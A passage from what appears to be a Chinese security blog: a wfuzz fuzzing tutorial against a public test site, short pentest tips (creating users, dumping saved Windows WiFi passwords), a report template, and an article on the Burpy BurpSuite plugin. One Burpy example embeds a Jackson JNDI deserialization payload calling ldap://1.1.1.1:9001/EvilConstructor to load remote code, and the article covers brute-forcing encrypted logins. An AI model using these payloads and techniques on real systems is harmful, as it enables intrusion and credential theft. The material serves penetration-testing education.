<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /agent HTTP/1.1</span><br><span class="line">Host: testphp.vulnweb.com</span><br><span class="line">Accept: */*</span><br><span class="line">Myheader2:  headervalue2</span><br><span class="line">Myheader:  headervalue</span><br><span class="line">Content-Type:  application/x-www-form-urlencoded</span><br><span class="line">User-Agent:  Wfuzz/2.2</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>我们还可以修改存在的请求头，比如修改User-Agent头：<br><code>$ wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt -H &quot;myheader: headervalue&quot; -H &quot;User-Agent: Googlebot-News&quot; http://testphp.vulnweb.com/FUZZ</code></p>
<p>生成的HTTP请求如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /asp HTTP/1.1</span><br><span class="line">Host: testphp.vulnweb.com</span><br><span class="line">Accept: */*</span><br><span class="line">Myheader:  headervalue</span><br><span class="line">Content-Type:  application/x-www-form-urlencoded</span><br><span class="line">User-Agent:  Googlebot-News</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>Headers也可以被测试：<br><code>wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt -H &quot;User-Agent: FUZZ&quot; http://testphp.vulnweb.com/</code></p>
<hr>
<h3 id="测试HTTP请求方法（动词）"><a href="#测试HTTP请求方法（动词）" class="headerlink" title="测试HTTP请求方法（动词）"></a>测试HTTP请求方法（动词）</h3><p>HTTP请求方法的测试可通过指定<code>-X</code>参数指定：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[/usr/share/wfuzz/wordlist]</span><br><span class="line">└──╼ $wfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS -X FUZZ http://testphp.vulnweb.com/</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://testphp.vulnweb.com/</span><br><span class="line">Total requests: 5</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID      Response   Lines      Word         Chars          Request</span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">00002:  C=200      0 L         0 W            0 Ch        &quot;HEAD&quot;</span><br><span class="line">00004:  C=405      7 L        12 W          172 Ch        &quot;TRACE&quot;</span><br><span class="line">00005:  C=405      7 L        12 W          172 Ch        &quot;OPTIONS&quot;</span><br><span class="line">00001:  C=200    104 L       296 W         4096 Ch        &quot;GET&quot;</span><br><span class="line">00003:  C=200    104 L       296 W         4096 Ch        &quot;POST&quot;</span><br><span class="line"></span><br><span class="line">Total time: 1.030354</span><br><span class="line">Processed Requests: 5</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 4.852696</span><br></pre></td></tr></table></figure>
<p>如果在测试时要指定请求使用的HTTP方法（动词），同样可以使用<code>-X</code>参数指定。相当于御剑中的GET&#x2F;HEAD。HEAD方法要快一些。</p>
<hr>
<h3 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h3><p>如果在测试时想要使用代理的话，只需要传入<code>-p</code>参数即可：<br><code>$ wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt -p localhost:8080 http://testphp.vulnweb.com/FUZZ</code></p>
<p>默认情况下，指定的代理是HTTP Basic类型的，如果想用其他类型的代理，可通过指定类型来使用：<br><code>$ wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt -p localhost:2222:SOCKS5 http://testphp.vulnweb.com/FUZZ</code></p>
<p>多个代理可使用多个<code>-p</code>参数同时指定：<br><code>$ wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt -p localhost:8080 -p localhost:9090 http://testphp.vulnweb.com/FUZZ</code><br>这样每次请求都会选取不同的代理进行。</p>
<hr>
<h3 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h3><p>wfuzz可以通过<code>--basec/ntml/digest</code>来设置认证头。</p>
<p>例如，想要测试一个需要HTTP Basic Auth保护的内容可使用如下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[/usr/share/wfuzz/wordlist]</span><br><span class="line">└──╼ $wfuzz -z list,nonvalid-httpwatch --basic FUZZ:FUZZ https://www.httpwatch.com/httpgallery/authentication/authenticatedimage/default.aspx</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: https://www.httpwatch.com/httpgallery/authentication/authenticatedimage/default.aspx</span><br><span class="line">Total requests: 2</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000001:  C=401      0 L	      11 W	     58 Ch	  &quot;nonvalid&quot;</span><br><span class="line">000002:  C=200     20 L	      91 W	   5294 Ch	  &quot;httpwatch&quot;</span><br><span class="line"></span><br><span class="line">Total time: 1.332051</span><br><span class="line">Processed Requests: 2</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 1.501443</span><br></pre></td></tr></table></figure>

<p>想测试经过认证之后的资源，我们可以通过指定<code>--basic user:pass</code>的方式来测试。</p>
<hr>
<h3 id="递归测试"><a href="#递归测试" class="headerlink" title="递归测试"></a>递归测试</h3><p>使用<code>-R</code>参数可以指定一个payload被递归的深度。例如，暴破目录时，我们想使用相同的payload对已发现的目录进行测试，可以使用如下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[/usr/share/wfuzz/wordlist]</span><br><span class="line">└──╼ $wfuzz -z list,&quot;admin-CVS-cgi\-bin&quot; -R 1 http://testphp.vulnweb.com/FUZZ</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://testphp.vulnweb.com/FUZZ</span><br><span class="line">Total requests: 3</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000002:  C=301      7 L	      12 W	    184 Ch	  &quot;CVS&quot;</span><br><span class="line"> |_  Enqueued response for recursion (level=1)</span><br><span class="line">000001:  C=301      7 L	      12 W	    184 Ch	  &quot;admin&quot;</span><br><span class="line"> |_  Enqueued response for recursion (level=1)</span><br><span class="line">000003:  C=403     10 L	      29 W	    263 Ch	  &quot;cgi-bin&quot;</span><br><span class="line">000005:  C=404      7 L	      12 W	    168 Ch	  &quot;CVS - CVS&quot;</span><br><span class="line">000006:  C=404      7 L	      12 W	    168 Ch	  &quot;CVS - cgi-bin&quot;</span><br><span class="line">000004:  C=404      7 L	      12 W	    168 Ch	  &quot;CVS - admin&quot;</span><br><span class="line">000007:  C=404      7 L	      12 W	    168 Ch	  &quot;admin - admin&quot;</span><br><span class="line">000008:  C=404      7 L	      12 W	    168 Ch	  &quot;admin - CVS&quot;</span><br><span class="line">000009:  C=404      7 L	      12 W	    168 Ch	  &quot;admin - cgi-bin&quot;</span><br><span class="line"></span><br><span class="line">Total time: 1.584295</span><br><span class="line">Processed Requests: 9</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 5.680760</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="测试速度与效率"><a href="#测试速度与效率" class="headerlink" title="测试速度与效率"></a>测试速度与效率</h3><p>根据对目标的影响和自身的承受能力及带宽，wfuzz提供了一些参数可以用来调节HTTP请求引擎。</p>
<p>使用<code>-t</code>参数可以增加或减少同时发送HTTP请求的数量。<br>使用<code>-s</code>参数可以调节每次发送HTTP的时间间隔。</p>
<hr>
<h3 id="输出到文件"><a href="#输出到文件" class="headerlink" title="输出到文件"></a>输出到文件</h3><p>wfuzz通过<code>printers</code>插件来将结果以不同格式保存到文档中，可用的<code>printers</code>参考上面的<code>重要关键词</code>。<br>将结果以<code>json</code>格式输出到文件的命令如下：<br><code>$ wfuzz -f /tmp/outfile,json -w /usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ</code></p>
<hr>
<h3 id="不同的输出"><a href="#不同的输出" class="headerlink" title="不同的输出"></a>不同的输出</h3><p>直接使用不同格式在命令行输出的话，可使用下面的命令：<br><code>$ wfuzz -o json -w /usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ</code></p>
]]></content>
      <categories>
        <category>web-sec</category>
      </categories>
  </entry>
  <entry>
    <title>渗透测试小技巧</title>
    <url>/pentest/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="非交互式添加用户并创建密码"><a href="#非交互式添加用户并创建密码" class="headerlink" title="非交互式添加用户并创建密码"></a>非交互式添加用户并创建密码</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">useradd <span class="built_in">test</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;test:123&quot;</span> | sudo chpasswd</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">useradd test2</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;123&quot;</span> | passwd --stdin test2</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">passwd -d test2 <span class="comment">#（设置密码之后）删除密码，即可以空密码登录</span></span></span><br></pre></td></tr></table></figure>

<h2 id="获取Windows机器上保存的WIFI密码"><a href="#获取Windows机器上保存的WIFI密码" class="headerlink" title="获取Windows机器上保存的WIFI密码"></a>获取Windows机器上保存的WIFI密码</h2><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><p><code>(netsh wlan show profiles) | Select-String &quot;\:(.+)$&quot; | %&#123;$name=$_.Matches.Groups[1].Value.Trim(); $_&#125; | %&#123;(netsh wlan show profile name=&quot;$name&quot; key=clear)&#125;  | Select-String &quot;Key Content\W+\:(.+)$&quot; | %&#123;$pass=$_.Matches.Groups[1].Value.Trim(); $_&#125; | %&#123;[PSCustomObject]@&#123; PROFILE_NAME=$name;PASSWORD=$pass &#125;&#125; | Format-Table -AutoSize </code></p>
<h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><p><code>netsh wlan show profiles &quot;NETWORK-SSID&quot; key=clear</code></p>
]]></content>
      <categories>
        <category>pentest</category>
      </categories>
  </entry>
  <entry>
    <title>渗透测试报告模板</title>
    <url>/pentest/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A%E6%A8%A1%E6%9D%BF.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="测试目的"><a href="#测试目的" class="headerlink" title="测试目的"></a>测试目的</h3><p>通过模拟黑客的渗透测试，评估目标系统是否存在可以被攻击者真实利用的漏洞以及由此引起的风险大小，为制定相应的安全措施与解决方案提供实际的依据。</p>
<p>分析客户WEB应用系统的安全现状，检测WEB应用系统的漏洞和安全问题，并验证其他已知的脆弱点。对系统的任何弱点、技术缺陷或漏洞的主动分析，并且以有利于攻击为目的而对漏洞加以利用。从而全面了解和掌握WEB应用系统的信息安全威胁和风险，为WEB应用系统开展安全调优及加固建设提供依据，并指导客户实施调优及加固工作，具体的目标包括：</p>
<ol>
<li>帮助客户理解应用系统当前的安全状况，发现在系统复杂结构中的最脆弱链路；</li>
<li>通过改进建议，保证WEB应用系统和相关基础设施满足标准的安全性基线；</li>
<li>降低WEB应用系统信息安全事件发生的可能性；</li>
<li>保障WEB应用系统的安全、可靠、稳定运行。</li>
</ol>
<h3 id="测试范围"><a href="#测试范围" class="headerlink" title="测试范围"></a>测试范围</h3><table>
<thead>
<tr>
<th>序号</th>
<th align="center">系统名称</th>
<th align="center">地址</th>
<th align="center">权限</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td align="center">test</td>
<td align="center"><a href="http://test.com/">http://test.com</a></td>
<td align="center">普通用户</td>
</tr>
</tbody></table>
<h3 id="测试团队详细信息"><a href="#测试团队详细信息" class="headerlink" title="测试团队详细信息"></a>测试团队详细信息</h3><table>
<thead>
<tr>
<th>序号</th>
<th align="center">姓名</th>
<th align="center">联系方式</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td align="center">宋鑫磊</td>
<td align="center">18888888888</td>
</tr>
</tbody></table>
<h3 id="测试结果综述"><a href="#测试结果综述" class="headerlink" title="测试结果综述"></a>测试结果综述</h3><p>对整体渗透测试结果进行综合评价，包括：整体概述，漏洞分布及风险</p>
<h2 id="详细测试流程"><a href="#详细测试流程" class="headerlink" title="详细测试流程"></a>详细测试流程</h2><p>描述漏洞复现流程</p>
<h4 id="例如：若口令登录漏洞"><a href="#例如：若口令登录漏洞" class="headerlink" title="例如：若口令登录漏洞"></a>例如：若口令登录漏洞</h4><p>流程描述+截图</p>
<h4 id="例如：文件上传漏洞"><a href="#例如：文件上传漏洞" class="headerlink" title="例如：文件上传漏洞"></a>例如：文件上传漏洞</h4><p>流程描述+截图</p>
<h2 id="风险评级"><a href="#风险评级" class="headerlink" title="风险评级"></a>风险评级</h2><p>通过整体漏洞评价，对网站&#x2F;系统的风险进行评级及影响评级，简要描述即可。</p>
<h2 id="漏洞详情及修复建议"><a href="#漏洞详情及修复建议" class="headerlink" title="漏洞详情及修复建议"></a>漏洞详情及修复建议</h2><p>（整理漏洞以及给出评价&#x2F;修复建议）</p>
<h3 id="例如：若口令登录漏洞-1"><a href="#例如：若口令登录漏洞-1" class="headerlink" title="例如：若口令登录漏洞"></a>例如：若口令登录漏洞</h3><table>
<thead>
<tr>
<th align="left">风险评级</th>
<th align="left">High</th>
</tr>
</thead>
<tbody><tr>
<td align="left">漏洞描述</td>
<td align="left">漏洞描述</td>
</tr>
<tr>
<td align="left">漏洞影响</td>
<td align="left">漏洞影响</td>
</tr>
<tr>
<td align="left">修复建议</td>
<td align="left">修复建议</td>
</tr>
</tbody></table>
<h3 id="例如：文件上传漏洞-1"><a href="#例如：文件上传漏洞-1" class="headerlink" title="例如：文件上传漏洞"></a>例如：文件上传漏洞</h3><table>
<thead>
<tr>
<th align="left">风险评级</th>
<th align="left">High</th>
</tr>
</thead>
<tbody><tr>
<td align="left">漏洞描述</td>
<td align="left">漏洞描述</td>
</tr>
<tr>
<td align="left">漏洞影响</td>
<td align="left">漏洞影响</td>
</tr>
<tr>
<td align="left">修复建议</td>
<td align="left">修复建议</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>pentest</category>
      </categories>
  </entry>
  <entry>
    <title>打通BurpSuite与Python之间的任督二脉</title>
    <url>/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89.html</url>
    <content><![CDATA[<blockquote>
<p>转发自安全客，<a href="https://www.anquanke.com/post/id/206430">https://www.anquanke.com/post/id/206430</a></p>
</blockquote>
<blockquote>
<p>Burpy是一款能够打通BurpSuite和Python之间任督二脉的插件，从此之后，你可以用你的python任意处理Http包了！</p>
</blockquote>
<h2 id="Burpy"><a href="#Burpy" class="headerlink" title="Burpy"></a>Burpy</h2><p>首先，BurpSuite插件已经那么多了，真的缺这一个？<br>面对这个<code>To be, or not to be</code>的灵魂之问，咱们先回答一下下面的问题：</p>
<ul>
<li>你的BurpSuite中有多少插件？</li>
<li>你有没有这样的情况：有些工作我用大python写的，测试的时候需要burpsuite，所以干活的时候是不断地在命令行、Burpsuite、浏览器三个之间来回切换。</li>
</ul>
<p>我就遇到一个RSA加密的流量，没有这个插件，我干活的状态应该是这样的：</p>
<ul>
<li>编写一个RSA加密脚本</li>
<li>打开一个命令行，执行命令把我的payload加密</li>
<li>右键复制</li>
<li>切换到BurpSuite，粘贴加密之后的payload</li>
<li>发送请求，分析返回结果</li>
<li>切换到命令行，更换payload，执行python脚本加密</li>
<li>再复制</li>
<li>再粘贴</li>
<li>再发送请求<br>….</li>
</ul>
<p>上面过程我才测试了两个payload，如果你有50个payload，你是不是想把电脑摔了？或者问候一下某人先人？</p>
<p>有朋友可能会说了，我有插件呀！<br>对，RSA可以弄个插件。那下一个活，不是RSA了，加了签名怎么办？<br>答：再写个插件！<br>对，如果下一个活，加密&#x2F;签名算法不一样，比如有些加了时间戳，取url中后6位与时间戳合并，算32位的md5之后，把md5从中间劈开，前16位做key&#x2F;后16位做iv，做了AES呢？<br>答：再写个插件！<br>….</p>
<p>那结果可能是，你的BurpSuite中装满了各式各样的插件！</p>
<p>假设上面的情况下，你还需要做Intruder的动作，可你的插件只做了加密，怎么办？<br>答：改插件！</p>
<p>如果你的回答跟上面一致，那么请大佬收下我的膝盖！</p>
<p>不是每个人都快速开发一个插件，而不同的活，用到的插件也不一定完全一样，并且改插件的话，需要了解BurpSuite内部的东西，这限制了团队内其他人员的发挥。</p>
<p>在深深的体验了上面不同情况下的痛楚之后，一个来自CFCA信息安全部的同志，小心翼翼地打开了破解版本的idea，学习了<code>Brida</code>插件的代码之后，通过大量复制、粘贴和修改之后，完成了一个他心目中的那个插件——<code>Burpy</code>～</p>
<p>从此之后，它的BurpSuite中只有一个插件，那就是<code>Burpy</code>。（当然有时会用一下Brida）</p>
<p><code>Burpy</code>，一个Burpy胜过千万个插件，是您居家日站的必备良器！<br>渗透测试人员必备两个技能：BurpSuite工具和Python脚本，<code>Burpy</code>就是打通这任督二脉的神器！</p>
<p>恩，字数上应该差不多了，下面进入正题。</p>
<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>执行指定python脚本，并将处理结果返回给BurpSuite。</p>
<h3 id="功能、UI介绍"><a href="#功能、UI介绍" class="headerlink" title="功能、UI介绍"></a>功能、UI介绍</h3><p><img src="/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/2020-05-21-09-58-05.png"><br>是不是很眼熟？简直就是<code>Brida</code>的亲兄弟有没有！这点恰恰证明了作为唯一开发者的我的Java编程功底～对，就是很浅。</p>
<p>这里有个注意事项：要用python2。</p>
<p>在<code>Burpy PY file path:</code>里面指定好你自己的python脚本，点击<code>start server</code>，就可以开心的干活了。</p>
<p>大家注意看这里：<br><img src="/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/2020-05-21-10-06-59.png"><br>这个地方是一些开关，为了右键菜单更加简洁。点上之后，右键菜单会有变化。</p>
<p>把这些开关都点上，来看一眼右键菜单：<br><img src="/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/2020-05-21-10-07-28.png"></p>
<p><code>Burpy Main</code>会自动调用我们脚本中的<code>main</code>方法<br><code>Burpy Enc</code>会自动调用<code>encrypt</code>方法<br>依次类推。</p>
<p><code>Enable Processor</code>和<code>Enable Auto Enc/Dec</code>这两个开关的功能比较特殊，这里分开说一下</p>
<p>打开<code>enable processor</code>之后，在使用<code>Intruder</code>进行暴力破解之类的动作时，如果payload需要进行加密或签名，我们就可以把加密&#x2F;签名的算法实现到自己有python脚本的<code>processor</code>函数中，参见下面的例子。</p>
<p>打开<code>Enable Auto Enc/Dec</code>之后，你就自由了！加密？不存在的！参见下面的例子。</p>
<h3 id="脚本怎么写"><a href="#脚本怎么写" class="headerlink" title="脚本怎么写"></a>脚本怎么写</h3><p>在我们自己的脚本中，要新建一个<code>Burpy</code>类，此类在<code>start server</code>的时候会进行初始化。<br>Burpy类有这样几个函数：<code>main</code>, <code>encrypt</code>, <code>decrypt</code>, <code>sign</code>, <code>processor</code>，作用咱们上面提到了，不再重复</p>
<p>其中，<code>main</code>函数是必须的，因为右键菜单始终会有一个<code>Burpy Main</code>，这个菜单就是调用的<code>main</code>函数。（如果你连<code>Burpy Main</code>也不调用，这个函数也是可以没有的）</p>
<p>其他的函数看需要，可有可无。之所以这样设计是因为，不是每次你都要进行加解密操作，有时候你只需要进行个md5或者base64就行。贴不贴心？</p>
<p><code>Talk is cheap, show me the code!</code><br>下面咱们看几个例子吧！</p>
<h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><p>这是一个base64编码的例子，其实呢，base64功能很多插件都有，burpsuite自己也有，这里只是为了说明一下Burpy的用法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Burpy</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    header is list, append as your need</span></span><br><span class="line"><span class="string">    body is string, modify as your need</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        <span class="keyword">return</span> header, body</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        body = base64.b64encode(body)</span><br><span class="line">        <span class="keyword">return</span> header, body</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        <span class="keyword">return</span> header, body</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        <span class="keyword">return</span> header, body</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">processor</span>(<span class="params">self, payload</span>):</span><br><span class="line">        <span class="keyword">return</span> payload+<span class="string">&quot;burpyed&quot;</span></span><br></pre></td></tr></table></figure>

<p>很简单对不对？<br>Burpy的灵活之处就在这里，它把整个HTTP数据包都发送到脚本进行处理，HTTP头保存在<code>header</code>列表中，<code>body</code>是个字符串，想怎么处理就怎么处理，处理完把header和body返回就搞定。</p>
<p><img src="/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/base64_test.gif"><br>上面的函数中，我们只用到了<code>encrypt</code>，其实其他函数都可以删掉的</p>
<h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><p>上面的例子太简单了有没有，这个功能很鸡肋，burpsuite中使用<code>ctrl+b</code>快捷键就完成了，还得写个脚本，这不是大晴天打伞——多此一举吗？<br>来来来，看看下面这个例子。<br>代码有些长….<br>先在这说明一下：下面代码是做RSA加密的。在这个项目中，用户名和密码是经过RSA加密之后传给服务器的，服务器会解密，通过其他漏洞拿到源代码，分析之后发现可能存在Jackson反序列化漏洞，于是写了这个脚本来测试。<br>这个RSA加密中会取当前时间，再取一个6位随机字符，拼接成一个<code>nonce</code>，而公钥可以在浏览器的JS里面找到。如果没有这个插件，想做这件事基本上很难，找到js代码之后还要在浏览器是执行js代码，复制粘贴等等，幸好我们有<code>Burpy</code>，来看下脚本和体验如何吧！（如下内容已做脱敏）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Burpy</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        body_json = json.loads(body)</span><br><span class="line">        username = <span class="built_in">repr</span>(body_json.get(<span class="string">&quot;username&quot;</span>))</span><br><span class="line">        body_json[<span class="string">&quot;username&quot;</span>] = <span class="string">&quot;_XXXX_ENC_:V1:RSA:XXXX0001:&quot;</span> + self.rsa_enc(username)</span><br><span class="line">        body = json.dumps(body_json)</span><br><span class="line">        <span class="keyword">return</span> header, body</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rsa_enc</span>(<span class="params">self,data</span>):</span><br><span class="line">        <span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">        <span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode,b64encode</span><br><span class="line">        <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line">        <span class="keyword">import</span> time</span><br><span class="line">        <span class="keyword">import</span> random</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="built_in">round</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line">        s = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            s += <span class="built_in">str</span>(random.randint(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">        e = <span class="built_in">str</span>(t) + s</span><br><span class="line"></span><br><span class="line">        i = <span class="built_in">dict</span>()</span><br><span class="line">        i[<span class="string">&quot;text&quot;</span>] = data</span><br><span class="line">        i[<span class="string">&quot;timestamp&quot;</span>] = t+<span class="number">5</span></span><br><span class="line">        i[<span class="string">&quot;nonce&quot;</span>] = e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        pubStr = <span class="string">&quot;MIIxxxxxx9hnjsRkHvPUVT91pl9fR9VKn/F/JbwrNlDZQOnd0AXxxxxxxxcP61EVOdEqAdtA1law/6Z9O4c1nHaDBblx3R9Sr7Lxxxxxx0kxoox7LlAInToUqU1ofWNf0FlF+A6kd1wZhil1Iha9NS8z7UfMx92jxh9RtGWFKxxxxxl4UJsQoS7krDN6skb8SLwga4QYUU3ua8GCxxxxxxx&quot;</span></span><br><span class="line">        msg = json.dumps(i)</span><br><span class="line">        <span class="comment">#msg = &quot;1565246122420&quot; + msg</span></span><br><span class="line">        keyDER = b64decode(pubStr)</span><br><span class="line">        keyPub = RSA.importKey(keyDER)</span><br><span class="line">        cipher = PKCS1_v1_5.new(keyPub)</span><br><span class="line">        ct = cipher.encrypt(msg.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        ect = b64encode(ct)</span><br><span class="line">        <span class="keyword">return</span> ect</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    b = Burpy()</span><br><span class="line">    header = []</span><br><span class="line">    body = <span class="string">&#x27;&#123;&quot;username&quot;: &#123;&quot;text&quot;: [&quot;org.hibernate.jmx.StatisticsService&quot;,&#123;&quot;sessionFactoryJNDIName&quot;: &quot;ldap://1.1.1.1:9001/EvilConstructor&quot;&#125;]&#125;, &quot;svcCode&quot;: &quot;client:009&quot;, &quot;password&quot;: &quot;2&quot;, &quot;orgCode&quot;: &quot;xxxx&quot;&#125;&#x27;</span></span><br><span class="line">    header1,body1 = b.main(header, body)</span><br><span class="line">    <span class="built_in">print</span> body1</span><br></pre></td></tr></table></figure>
<p>来体验一把：<br><img src="/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/rsa_test.gif"></p>
<h4 id="payload-processor"><a href="#payload-processor" class="headerlink" title="payload processor"></a>payload processor</h4><p>怎么样？有没有感觉通畅了许多？</p>
<p>这还不是最令人兴奋的。来一起看一下<code>payload processor</code>。</p>
<p>试想一下，你想暴力破解上面这种系统的用户名密码，能做到不？难。<br>但是，用<code>Burpy</code>只需要像下面这样设置一下就可以跑了：</p>
<p>首先，勾选<code>Enable Processor</code>，<br>然后，在我们的脚本中加入<code>processor</code>函数，并编写逻辑调用已经写好的<code>rsa_enc</code>函数<br>然后就是常规操作，看这里：<br><img src="/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/processor_test.gif"></p>
<p>其实，这个<code>processor</code>加密之后的密文前边应该再加上一些字符串，但我实在太懒了，你们应该都知道怎么改这个脚本的，我相信你们。</p>
<p>看到这里，有同学可能问了，恩恩，很好，很6,但是，为啥这个脚本这么麻烦？直接接数据返回不就行了吗？</p>
<p>当当当当，你说的对，但是，一次偶然的机会（其实是经常遇到），我需要测试一个APP，它加载一个web页面，里面有js代码，js代码经过了webpack。<br>其中，流量是加密的，怎么办？</p>
<p>往下看！</p>
<h4 id="webdriver"><a href="#webdriver" class="headerlink" title="webdriver"></a>webdriver</h4><p>首先推荐一个模块——<code>moduleRaid.js</code>，自己去github上找吧，不多解释，因为我也不懂它怎么做到的。<br>反正，用了这个之后，你就可能在浏览器控制台下拉调用webpack之后的一些js的功能，如加密&#x2F;解密！</p>
<p>很神奇有没有，但是问题来了，我们测试的是APP呀，又不是浏览器上的web站！<br>难道要打开手机APP内部的<code>webview</code>的控制台，再用手机键盘输入那些js命令？<br>然后怎么从手机webview控制台中把js执行结果复制出来？</p>
